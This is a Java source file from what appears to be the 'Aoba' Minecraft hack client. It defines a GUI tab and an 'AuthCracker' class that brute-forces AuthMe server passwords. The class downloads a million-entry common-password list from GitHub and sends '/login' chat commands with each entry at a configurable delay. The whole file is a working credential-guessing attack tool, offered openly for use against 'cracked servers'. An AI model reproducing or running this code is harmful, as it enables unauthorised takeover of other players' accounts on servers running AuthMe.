package net.aoba.gui.tabs;

import java.io.IOException;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import net.aoba.gui.tabs.components.ButtonComponent;
import net.aoba.gui.tabs.components.SliderComponent;
import net.aoba.gui.tabs.components.StringComponent;
import net.aoba.settings.SliderSetting;
import net.minecraft.client.MinecraftClient;

public class AuthCrackerTab extends ClickGuiTab {
	
	private StringComponent information;
	private SliderComponent delaySlider;
	private ButtonComponent start;

	private SliderSetting delay = new SliderSetting("Delay", "authcracker_delay", 100, 50, 50000, 1);

	private AuthCracker authCracker;
	
	Runnable startRunnable;
	Runnable endRunnable;
	
	public AuthCrackerTab(String title, int x, int y){
		super(title, x, y);
		
		this.information = new StringComponent("This panel can be used to break Auth passwords used in cracked servers.", this);
		this.addChild(information);
		
		this.delaySlider = new SliderComponent(this, delay);
		this.addChild(delaySlider);
		
		authCracker = new AuthCracker(delay);
		
		this.startRunnable = new Runnable() {
			@Override
		    public void run() {
				authCracker.Start();
				start.setText("Cancel");
				start.setOnClick(endRunnable);
		    }
		};
		
		this.endRunnable = new Runnable() {
			@Override
			public void run() {
				authCracker.Stop();
				start.setText("Start");
				start.setOnClick(startRunnable);
			}
		};
		
		this.start = new ButtonComponent(this, "Start", startRunnable);
		this.addChild(this.start);
	}
}

class AuthCracker{

	private Thread curThread;
	private boolean shouldContinue = true;
	private MinecraftClient mc = MinecraftClient.getInstance();
	private SliderSetting delay;
	
	public AuthCracker(SliderSetting delay) {
		this.delay = delay;
	}
	
	private long time = System.currentTimeMillis();
	
	private void RunAuthCracker() {
		System.out.println("Aoba AuthMe Cracker Started.");
		URL url;
		Scanner s = null;
		try {
			url = new URL("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt");
			s = new Scanner(url.openStream());
		} catch (IOException e) {
			e.printStackTrace();
		}
		if(s != null) {
			while(shouldContinue && s.hasNextLine()) {
				if(System.currentTimeMillis() - time > delay.getValue()) {
					String str = s.nextLine();
					while(mc.player == null) {
						try {
							TimeUnit.SECONDS.sleep(1);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
					if(mc.player.networkHandler != null) {
						mc.player.networkHandler.sendChatCommand("login " + str);
						time = System.currentTimeMillis();
					}else {
						System.out.println("Network Handler is null");
					}
				}
			}
		}
		
		System.out.println("Aoba AuthMe Cracker Stopped.");
	}
	
	public void Start() {
		curThread = new Thread(new Runnable() {
		    @Override
		    public void run() {
		    	RunAuthCracker();
		    }
		});  
		curThread.start();
	}
	
	public void Stop() {
		this.shouldContinue = false;
	}
}